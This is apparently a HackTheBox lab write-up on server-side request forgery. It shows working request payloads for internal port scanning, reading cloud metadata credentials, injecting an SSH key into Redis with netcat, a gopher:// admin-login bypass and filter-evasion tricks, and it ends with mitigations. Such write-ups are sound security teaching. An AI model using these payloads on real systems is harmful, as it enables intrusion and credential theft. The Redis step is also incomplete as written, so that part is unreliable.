# HTB-Writeup-SSRF
HackTheBox Writeup: Exploiting SSRF vulnerabilities for internal network enumeration, cloud metadata extraction, and remote code execution using tools like Burp Suite, ffuf, netcat, and gopher.

By Ramyar Daneshgar 

---

# **Exploiting Server-Side Request Forgery (SSRF)**
## **Introduction**
During a security assessment of a web application, I identified a **Server-Side Request Forgery (SSRF) vulnerability** that allowed me to interact with internal services. This write-up walks through the **full attack chain**, from **initial identification** to **advanced exploitation techniques**, and concludes with **mitigation recommendations**.

## **Step 1: Initial Reconnaissance**
### **Identifying Potential SSRF**
The target web application had a feature that allowed users to check appointment availability. The request structure looked like this:

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

dateserver=http://dateserver.htb&date=2024-01-01
```

This indicated that the backend was making requests to an external URL (`dateserver.htb`). My hypothesis was that **user input controlled the URL** the server requested.

### **Confirming SSRF**
To verify SSRF, I pointed `dateserver` to my own server using **Netcat**:

```bash
nc -lvnp 8000
```

Then, I modified the request in **Burp Suite**:

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

dateserver=http://myserver.com:8000&date=2024-01-01
```

**Result:** I received an inbound request, confirming SSRF.

```bash
connect to [MY_IP] from (UNKNOWN) [TARGET_IP] 43210
GET / HTTP/1.1
Host: MY_IP:8000
Accept: */*
```

### **Checking if SSRF is Blind**
To determine whether the response was returned, I set the URL to `http://127.0.0.1/index.php`. If the response contained **HTML output from index.php**, it was **non-blind SSRF**. Otherwise, it was **blind SSRF**.

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

dateserver=http://127.0.0.1/index.php&date=2024-01-01
```

The response contained HTML, confirming **reflected SSRF** (non-blind).

---

## **Step 2: Exploiting SSRF for Internal Enumeration**
### **Internal Port Scanning**
Since I controlled the server request, I used SSRF to **scan internal ports** by modifying the `dateserver` parameter:

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

dateserver=http://127.0.0.1:81&date=2024-01-01
```

If the **port was closed**, the server returned:

```http
HTTP/1.1 500 Internal Server Error
```

If the **port was open**, it returned:

```http
HTTP/1.1 200 OK
```

To automate this, I used **ffuf**:

```bash
seq 1 10000 > ports.txt
ffuf -w ./ports.txt -u http://target.com/check_availability -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

**Results:**
- Port `80` (Web server)
- Port `3306` (MySQL)
- Port `6379` (Redis)
- Port `8000` (Admin panel)

---

## **Step 3: Advanced SSRF Exploitation**
### **Accessing Internal Web Applications**
With **port 8000 open**, I modified the request:

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

dateserver=http://127.0.0.1:8000/admin.php&date=2024-01-01
```

**Response:** Internal admin panel exposed.

---

### **Exploiting Cloud Metadata Services**
Many cloud services have metadata endpoints that provide credentials and configurations:

- **AWS:** `http://169.254.169.254/latest/meta-data/`
- **Google Cloud:** `http://metadata.google.internal/`
- **Azure:** `http://169.254.169.254/metadata/instance?api-version=2019-08-15`

I tested:

```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

dateserver=http://169.254.169.254/latest/meta-data/iam/security-credentials/&date=2024-01-01
```

**Result:** AWS credentials leaked.

---

### **Exploiting Redis**
Redis exposed on **port 6379** could allow writing files or remote code execution.

**Injecting SSH Key for Access:**
```bash
(echo -e "\n\n\n\n"; echo -e "set foo \"\n\n\n\n\nssh-rsa AAA... my-key\"\n\n\n\n\n") | nc -v 127.0.0.1 6379
```

**Result:** SSH access gained.

---

### **SSRF to Remote Code Execution (gopher://)**
If the target had **SSRF with `gopher://` support**, I could craft a **POST request** to the internal MySQL server:

```bash
gopher://127.0.0.1:3306/_POST%20/admin.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw=admin
```

Encoded payload:
```http
POST /check_availability HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 265

dateserver=gopher%3a//127.0.0.1:80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520127.0.0.1%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin
```

**Result:** Admin login bypassed.

---

## **Step 4: Bypassing SSRF Protections**
### **Bypassing URL Whitelisting**
If the server allowed only specific domains, I used:
- **DNS Rebinding**: Attacking through `myattacker.com` that resolves to `127.0.0.1` dynamically.
- **Open Redirects**: Using `http://trusted.com/redirect?url=http://127.0.0.1/admin.php`.

### **Bypassing Blacklists**
If **"localhost"** was blocked, I used:
- `127.0.0.1`
- `2130706433` (Decimal representation of 127.0.0.1)
- `0x7f000001` (Hex representation)

---

## **Lessons Learned & Mitigations**
### **1. Validate User Input Server-Side**
- Implement **strict whitelists** (not blacklists).
- Restrict URLs to **trusted domains**.

### **2. Disable Internal Access**
- **Block internal requests** from the web server.
- Implement **metadata API protection** (e.g., AWS IMDSv2).

### **3. Restrict gopher:// and file:// Schemes**
- Disable dangerous schemes like **gopher://** and **file://** in request libraries.

### **4. Enforce Least Privilege**
- **Limit outbound network requests** from the web application.
- Ensure Redis, MySQL, and other services **require authentication**.

